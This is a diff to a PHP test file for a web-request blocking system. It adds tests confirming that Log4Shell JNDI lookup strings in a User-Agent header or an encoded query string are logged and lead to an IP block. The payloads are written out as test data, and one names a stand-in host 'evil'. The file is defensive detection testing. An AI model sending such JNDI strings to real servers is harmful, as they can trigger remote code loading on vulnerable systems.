@@ -80,6 +80,32 @@ test('ssti canary triggers an instant block', function () {
     expect(BlockedIp::query()->where('ip_address', '198.51.100.54')->exists())->toBeTrue();
 });
 
+test('log4shell jndi payload in the user agent triggers an instant block', function () {
+    $this->withServerVariables(['REMOTE_ADDR' => '198.51.100.55']);
+
+    $this->withHeaders([
+        'User-Agent' => '${jndi:ldap://127.0.0.1:1389/a}',
+    ])->get('/')->assertForbidden();
+
+    $log = SecurityLog::query()
+        ->where('ip_address', '198.51.100.55')
+        ->where('event_type', 'log4shell_jndi')
+        ->first();
+
+    expect($log)->not->toBeNull()
+        ->and($log->action_taken)->toBe('instant_block');
+
+    expect(BlockedIp::query()->where('ip_address', '198.51.100.55')->exists())->toBeTrue();
+});
+
+test('log4shell jndi payload in a query string triggers an instant block', function () {
+    $this->withServerVariables(['REMOTE_ADDR' => '198.51.100.56']);
+
+    $this->get('/?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D')->assertForbidden();
+
+    expect(BlockedIp::query()->where('ip_address', '198.51.100.56')->exists())->toBeTrue();
+});
+
 test('a blocked ip stays blocked for the configured duration', function () {
     $this->withServerVariables(['REMOTE_ADDR' => '198.51.100.59']);
 
